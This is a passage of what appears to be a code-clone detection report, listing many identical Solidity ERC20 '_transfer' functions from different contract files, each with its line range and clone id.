        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="108" endline="120" pcid="8340">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="108" endline="120" pcid="3139">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="107" endline="119" pcid="5207">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="114" endline="126" pcid="6931">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="109" endline="121" pcid="5192">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="107" endline="119" pcid="795">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="107" endline="119" pcid="2828">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="111" endline="123" pcid="825">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="109" endline="121" pcid="6432">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="107" endline="119" pcid="2350">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="94" endline="106" pcid="8053">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="108" endline="120" pcid="1617">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="111" endline="123" pcid="2741">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="112" endline="124" pcid="7240">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="109" endline="121" pcid="3977">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="201" endline="213" pcid="4177">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="110" endline="122" pcid="5916">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="108" endline="120" pcid="1167">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="108" endline="120" pcid="9283">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="106" endline="118" pcid="8040">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="108" endline="120" pcid="5931">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="107" endline="119" pcid="4833">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="109" endline="121" pcid="3012">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="107" endline="119" pcid="8355">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="108" endline="120" pcid="2380">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="110" endline="122" pcid="3673">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="110" endline="122" pcid="4083">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="107" endline="119" pcid="2997">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="107" endline="119" pcid="8025">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="110" endline="122" pcid="5946">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="111" endline="123" pcid="7672">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="108" endline="120" pcid="5177">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="111" endline="123" pcid="7493">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="113" endline="125" pcid="2086">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="111" endline="123" pcid="3492">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="106" endline="118" pcid="8010">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="111" endline="123" pcid="2918">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="107" endline="119" pcid="3992">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="112" endline="124" pcid="736">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="111" endline="123" pcid="2440">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="104" endline="116" pcid="6916">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="111" endline="123" pcid="6617">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="107" endline="119" pcid="9213">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="111" endline="123" pcid="2843">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="104" endline="116" pcid="1632">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="109" endline="121" pcid="5967">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="106" endline="118" pcid="2516">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="105" endline="117" pcid="4893">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="104" endline="116" pcid="9081">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="109" endline="121" pcid="3655">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="109" endline="121" pcid="524">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="108" endline="120" pcid="7795">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="113" endline="125" pcid="2205">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="108" endline="120" pcid="6385">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="200" endline="212" pcid="3947">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="104" endline="116" pcid="2239">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="111" endline="123" pcid="2982">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="108" endline="120" pcid="2365">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="109" endline="121" pcid="6370">
    function _transfer(
        address from,
        address to,
        uint256 amount
